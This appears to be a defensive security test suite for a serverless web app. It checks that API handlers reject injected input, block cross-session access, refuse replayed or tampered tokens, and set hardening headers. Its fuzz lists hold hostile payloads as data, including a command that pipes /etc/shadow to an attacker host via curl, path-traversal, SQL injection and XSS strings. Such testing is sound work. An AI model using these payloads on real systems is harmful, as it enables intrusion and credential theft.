/**
 * tests/suite-strix-audit.cjs
 * Strix Autonomous AI Dynamic Application Security Testing (DAST) & Penetration Audit Harness
 *
 * Implements the Strix testing architecture:
 * 1. Reconnaissance & Surface Mapping (11 API Endpoints + Web Surface)
 * 2. Dynamic Parameter Fuzzing & Injection Defense (SQLi, NoSQLi, CMDi, Path Traversal, Prototype Pollution, XSS)
 * 3. Broken Access Control & IDOR / BOLA Verification
 * 4. Privilege Boundary & Cryptographic Tamper Defense
 * 5. Security Headers, Cookies & Defense-in-Depth Verification
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const assert = require('assert');
const { pathToFileURL } = require('url');

console.log('=================================================================');
console.log('🦉 STRIX AUTONOMOUS DYNAMIC APPLICATION SECURITY AUDIT HARNESS');
console.log('   Target: Lumina Vista Sovereign Cloud OS & IoT Gateways');
console.log('=================================================================\n');

let passCount = 0;
let failCount = 0;
const findings = [];

function it(id, title, fn) {
  try {
    const res = fn();
    if (res && typeof res.then === 'function') {
      return res.then(() => {
        passCount++;
        console.log(`  ✓ PASS [${id}]: ${title}`);
      }).catch(err => {
        failCount++;
        console.error(`  ✖ FAIL [${id}]: ${title}`);
        console.error(`    Error: ${err.message}`);
        findings.push({ id, title, error: err.message, status: 'FAILED' });
      });
    }
    passCount++;
    console.log(`  ✓ PASS [${id}]: ${title}`);
    return Promise.resolve();
  } catch (err) {
    failCount++;
    console.error(`  ✖ FAIL [${id}]: ${title}`);
    console.error(`    Error: ${err.message}`);
    findings.push({ id, title, error: err.message, status: 'FAILED' });
    return Promise.resolve();
  }
}

function createMockReqRes(options = {}) {
  const req = {
    method: options.method || 'GET',
    url: options.url || '/',
    query: options.query || {},
    headers: {
      host: options.host || 'lumina-vista-sigma.vercel.app',
      'x-forwarded-proto': options.proto || 'https',
      ...options.headers
    },
    body: options.body || {}
  };

  const headersSent = {};
  let statusCode = 200;
  let sentData = null;
  let ended = false;

  const res = {
    statusCode: 200,
    setHeader: (name, val) => {
      headersSent[name.toLowerCase()] = val;
    },
    getHeader: (name) => headersSent[name.toLowerCase()],
    status: (code) => {
      statusCode = code;
      res.statusCode = code;
      return res;
    },
    json: (data) => {
      sentData = data;
      ended = true;
      return res;
    },
    send: (data) => {
      sentData = data;
      ended = true;
      return res;
    },
    end: (data) => {
      if (data && !sentData) sentData = data;
      ended = true;
      return res;
    },
    _getStatusCode: () => statusCode,
    _getSentData: () => sentData,
    _getHeaders: () => headersSent
  };

  return { req, res };
}

async function runStrixAudit() {
  const rootDir = path.join(__dirname, '..');
  const redisMod = await import(pathToFileURL(path.join(rootDir, 'api', '_lib', 'redis.js')).href);
  const storage = redisMod.getSafeStorage();

  // Load Handlers
  const authMod = await import(pathToFileURL(path.join(rootDir, 'api', 'auth.js')).href);
  const adminMod = await import(pathToFileURL(path.join(rootDir, 'api', 'admin.js')).href);
  const storageMod = await import(pathToFileURL(path.join(rootDir, 'api', 'storage.js')).href);
  const syncMod = await import(pathToFileURL(path.join(rootDir, 'api', 'sync.js')).href);
  const workerMod = await import(pathToFileURL(path.join(rootDir, 'api', 'worker.js')).href);
  const iotMod = await import(pathToFileURL(path.join(rootDir, 'api', 'iot.js')).href);
  const adblockMod = await import(pathToFileURL(path.join(rootDir, 'api', '_lib', 'adblock-gateway.js')).href);
  const calendarMod = await import(pathToFileURL(path.join(rootDir, 'api', 'calendar.js')).href);
  const logoutMod = await import(pathToFileURL(path.join(rootDir, 'api', 'logout.js')).href);

  // -------------------------------------------------------------------------
  // PHASE 1: RECONNAISSANCE & ROUTE ENUMERATION
  // -------------------------------------------------------------------------
  console.log('--- [STRIX PHASE 1: Attack Surface Reconnaissance & Discovery] ---');

  await it('STRIX-REC-01', 'All 11 serverless edge endpoints expose default async handler', () => {
    assert(typeof authMod.default === 'function', 'auth handler missing');
    assert(typeof adminMod.default === 'function', 'admin handler missing');
    assert(typeof storageMod.default === 'function', 'storage handler missing');
    assert(typeof syncMod.default === 'function', 'sync handler missing');
    assert(typeof workerMod.default === 'function', 'worker handler missing');
    assert(typeof iotMod.default === 'function', 'iot handler missing');
    assert(typeof adblockMod.default === 'function', 'adblock handler missing');
    assert(typeof calendarMod.default === 'function', 'calendar handler missing');
    assert(typeof logoutMod.default === 'function', 'logout handler missing');
  });

  await it('STRIX-REC-02', 'Vercel configuration enforces strict HTTPS, HSTS, nosniff, and anti-framing', () => {
    const vercelConfig = JSON.parse(fs.readFileSync(path.join(rootDir, 'vercel.json'), 'utf8'));
    assert(Array.isArray(vercelConfig.headers), 'vercel.json missing headers array');
    const globalHeader = vercelConfig.headers.find(h => h.source === '/(.*)');
    assert(globalHeader, 'Global header rule missing');
    const headerMap = new Map(globalHeader.headers.map(h => [h.key, h.value]));
    assert.strictEqual(headerMap.get('X-Content-Type-Options'), 'nosniff');
    assert.strictEqual(headerMap.get('X-Frame-Options'), 'SAMEORIGIN');
    assert(headerMap.get('Strict-Transport-Security').includes('max-age=63072000'));
    assert(headerMap.get('Content-Security-Policy').includes("default-src 'self'"));
    assert(headerMap.get('Content-Security-Policy').includes("object-src 'none'"));
  });

  // -------------------------------------------------------------------------
  // PHASE 2: DYNAMIC INJECTION & PARAMETER FUZZING (OWASP A03:2021)
  // -------------------------------------------------------------------------
  const STORAGE_TRAVERSAL_PAYLOADS = [
    "' OR '1'='1",
    "1; DROP TABLE users; --",
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "<script>alert(document.domain)</script>",
    "<svg/onload=alert(1)>",
    "{\"__proto__\": {\"admin\": true}}",
    "; cat /etc/shadow | curl http://attacker.com",
    "| calc.exe",
    ".git/config",
    "node_modules/package.json",
    "package.json",
    "dashboard.html",
    "127.0.0.1\r\nSET injected_key evil"
  ];

  // A. Storage Path Traversal & Injection Fuzzing
  for (let i = 0; i < STORAGE_TRAVERSAL_PAYLOADS.length; i++) {
    const payload = STORAGE_TRAVERSAL_PAYLOADS[i];
    await it(`STRIX-INJ-PATH-${i + 1}`, `Storage API safely rejects traversal payload: ${payload.slice(0, 24)}...`, async () => {
      const { req, res } = createMockReqRes({
        method: 'POST',
        url: '/api/storage',
        headers: { 'x-session-id': 'session_master_strix_test' },
        body: { action: 'read', path: payload }
      });
      await storage.set('session:session_master_strix_test', JSON.stringify({ role: 'master', valid: true }));
      await storageMod.default(req, res);
      assert.strictEqual(res._getStatusCode(), 400, `Payload ${payload} must be rejected with 400 Bad Request`);
    });
  }

  // B. AdBlock Command Fuzzing
  const ADBLOCK_FUZZ_PAYLOADS = [
    "999.999.999.999",
    "192.168.1.1<script>alert(1)</script>",
    "' OR '1'='1",
    "192.168.1.1/24",
    "192.168.01.1",
    "127.0.0.1; reboot"
  ];
  await it('STRIX-INJ-ADBLOCK', 'AdBlock Gateway rejects fuzzing payloads on ban_client and set_name', async () => {
    for (const payload of ADBLOCK_FUZZ_PAYLOADS) {
      const { req, res } = createMockReqRes({
        method: 'POST',
        url: '/api/adblock?action=command',
        query: { action: 'command' },
        headers: { 'x-session-id': 'session_master_strix_test' },
        body: { cmd: 'ban_client', param: payload }
      });
      await adblockMod.default(req, res);
      assert.strictEqual(res._getStatusCode(), 400, `Payload ${payload} must be rejected with 400`);
    }
  });

  // -------------------------------------------------------------------------
  // PHASE 3: BROKEN ACCESS CONTROL & IDOR / BOLA (OWASP A01:2021)
  // -------------------------------------------------------------------------
  console.log('\n--- [STRIX PHASE 3: Broken Access Control & IDOR / BOLA] ---');

  await it('STRIX-IDOR-01', 'Worker API prevents cross-session job inspection (BOLA)', async () => {
    const victimJobId = 'job_strix_victim_42';
    await storage.set(`job_state:${victimJobId}`, JSON.stringify({
      id: victimJobId,
      ownerSessionId: 'session_victim_user_99',
      ownerRole: 'temporary',
      status: 'completed',
      reply: 'SECRET_CONFIDENTIAL_OUTPUT'
    }));

    const attackerSid = 'session_attacker_temp_88';
    await storage.set(`session:${attackerSid}`, JSON.stringify({
      sessionId: attackerSid,
      role: 'temporary',
      valid: true
    }));

    const { req, res } = createMockReqRes({
      method: 'GET',
      url: `/api/worker?jobId=${victimJobId}&action=output`,
      query: { jobId: victimJobId, action: 'output' },
      headers: { 'x-session-id': attackerSid }
    });

    await workerMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 403, 'Must return 403 Forbidden for non-owner job query');
    const body = res._getSentData();
    assert(!JSON.stringify(body).includes('SECRET_CONFIDENTIAL_OUTPUT'), 'Leaked victim job output');
  });

  await it('STRIX-BFLA-02', 'Temporary guest session cannot mutate shared workspace state (BFLA)', async () => {
    const guestSid = 'session_guest_temp_77';
    await storage.set(`session:${guestSid}`, JSON.stringify({
      sessionId: guestSid,
      role: 'temporary',
      valid: true
    }));

    const { req, res } = createMockReqRes({
      method: 'POST',
      url: '/api/sync',
      headers: { 'x-session-id': guestSid },
      body: { state: { evil: true } }
    });

    await syncMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 403, 'Temporary session state mutation must return 403 Forbidden');
  });

  await it('STRIX-BFLA-03', 'Temporary guest session cannot execute physical IoT restart or wipe credentials', async () => {
    const guestSid = 'session_guest_temp_77';
    const { req, res } = createMockReqRes({
      method: 'POST',
      url: '/api/iot',
      headers: { 'x-session-id': guestSid },
      body: { action: 'command', cmd: 'restart' }
    });

    await iotMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 403, 'IoT restart from temporary session must return 403 Forbidden');
  });

  await it('STRIX-BFLA-04', 'Temporary guest session cannot download audit logs in raw text', async () => {
    const guestSid = 'session_guest_temp_77';
    const { req, res } = createMockReqRes({
      method: 'GET',
      url: '/api/iot?action=logs&format=txt',
      query: { action: 'logs', format: 'txt' },
      headers: { 'x-session-id': guestSid }
    });

    await iotMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 403, 'Audit log download from temporary session must return 403 Forbidden');
  });

  // -------------------------------------------------------------------------
  // PHASE 4: CRYPTOGRAPHIC INTEGRITY & ANTI-TAMPERING
  // -------------------------------------------------------------------------
  console.log('\n--- [STRIX PHASE 4: Cryptographic Integrity & Anti-Tamper Probes] ---');

  await it('STRIX-CRYPTO-01', 'IoT Gateway rejects replay attacks with identical nonce and sequence', async () => {
    const secret = iotMod.getDeviceSecret();
    const nowSec = Math.floor(Date.now() / 1000);
    const nonce = crypto.randomBytes(16).toString('hex');
    const seq = '100';

    const testBody = JSON.stringify({ state: { lock: 'LOCKED' } });
    const sig = crypto.createHmac('sha256', secret)
      .update(`${iotMod.DEFAULT_DEVICE_ID}.${nowSec}.${nonce}.${seq}.${testBody}`)
      .digest('hex');

    const headers = {
      'x-lumina-device-id': iotMod.DEFAULT_DEVICE_ID,
      'x-lumina-timestamp': String(nowSec),
      'x-lumina-nonce': nonce,
      'x-lumina-seq': seq,
      'x-lumina-signature': sig
    };

    // First request passes
    const req1 = createMockReqRes({ method: 'POST', url: '/api/iot', headers, body: { state: { lock: 'LOCKED' } } });
    await iotMod.default(req1.req, req1.res);

    // Replayed request must be rejected
    const req2 = createMockReqRes({ method: 'POST', url: '/api/iot', headers, body: { state: { lock: 'LOCKED' } } });
    await iotMod.default(req2.req, req2.res);
    assert.strictEqual(req2.res._getStatusCode(), 401, 'Replayed nonce must be rejected with 401');
  });

  await it('STRIX-CRYPTO-02', 'Sovereign session token rejects invalid or tampered HMAC signature', async () => {
    const tamperedToken = 'lv_master_fakeuuid_' + Date.now() + '_deadbeefdeadbeefdeadbeefdeadbeef';
    const { req, res } = createMockReqRes({
      method: 'GET',
      url: '/api/admin',
      headers: { 'x-session-id': tamperedToken }
    });

    await adminMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 401, 'Tampered token must return 401');
  });

  // -------------------------------------------------------------------------
  // PHASE 5: DEFENSE-IN-DEPTH & PROTOCOL HYGIENE
  // -------------------------------------------------------------------------
  console.log('\n--- [STRIX PHASE 5: Protocol Hygiene & Defense-in-Depth] ---');

  await it('STRIX-HYG-01', 'Logout endpoint enforces atomic cookie clearing and token tombstoning', async () => {
    const activeSid = 'session_logout_target_123';
    await storage.set(`session:${activeSid}`, JSON.stringify({ role: 'master', valid: true }));

    const { req, res } = createMockReqRes({
      method: 'POST',
      url: '/api/logout',
      headers: { 'x-session-id': activeSid }
    });

    await logoutMod.default(req, res);
    assert.strictEqual(res._getStatusCode(), 200, 'Logout must succeed');
    const setCookie = res._getHeaders()['set-cookie'];
    assert(setCookie && setCookie.some(c => c.includes('godx_session=;')), 'godx_session cookie must be deleted');
    const tombstone = await storage.get(`session:revoked:${activeSid}`);
    assert.strictEqual(tombstone, '1', 'Session tombstone must be written to prevent token reuse');
  });

  await it('STRIX-HYG-02', 'Calendar Service Account token generation produces valid RS256 JWT header', () => {
    const { privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });
    const jwt = calendarMod.createServiceAccountJwt(
      'test@project.iam.gserviceaccount.com',
      privateKey
    );
    assert(typeof jwt === 'string' && jwt.split('.').length === 3, 'JWT must have 3 base64url parts');
  });

  console.log('\n=================================================================');
  console.log(`🦉 STRIX AUDIT COMPLETE: ${passCount} PASSED, ${failCount} FAILED`);
  console.log('=================================================================\n');

  if (failCount > 0) {
    process.exit(1);
  }
}

runStrixAudit().catch(err => {
  console.error('Fatal audit failure:', err);
  process.exit(1);
});
